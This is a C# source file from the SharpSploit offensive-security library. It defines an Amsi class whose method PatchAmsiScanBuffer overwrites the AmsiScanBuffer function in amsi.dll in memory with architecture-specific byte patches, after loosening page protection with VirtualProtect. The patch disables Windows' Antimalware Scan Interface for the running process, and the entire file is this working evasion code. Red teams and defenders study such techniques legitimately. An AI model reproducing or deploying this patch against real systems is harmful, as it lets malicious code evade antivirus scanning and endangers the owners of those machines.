﻿// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Runtime.InteropServices;

using SharpSploit.Misc;
using SharpSploit.Execution;

namespace SharpSploit.Evasion
{
    /// <summary>
    /// Amsi is a class for manipulating the Antimalware Scan Interface.
    /// </summary>
    public class Amsi
    {
        /// <summary>
        /// Patch the AmsiScanBuffer function in amsi.dll.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <returns>Bool. True if succeeded, otherwise false.</returns>
        /// <remarks>
        /// Credit to Adam Chester (@_xpn_).
        /// </remarks>
        public static bool PatchAmsiScanBuffer()
        {
            byte[] patch;
            if (Utilities.Is64Bit)
            {
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            }
            else
            {
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }

            try
            {
                var library = Win32.Kernel32.LoadLibrary("amsi.dll");
                var address = Win32.Kernel32.GetProcAddress(library, "AmsiScanBuffer");

                uint oldProtect;
                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, address, patch.Length);

                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Exception: " + e.Message);
                return false;
            }
        }
    }
}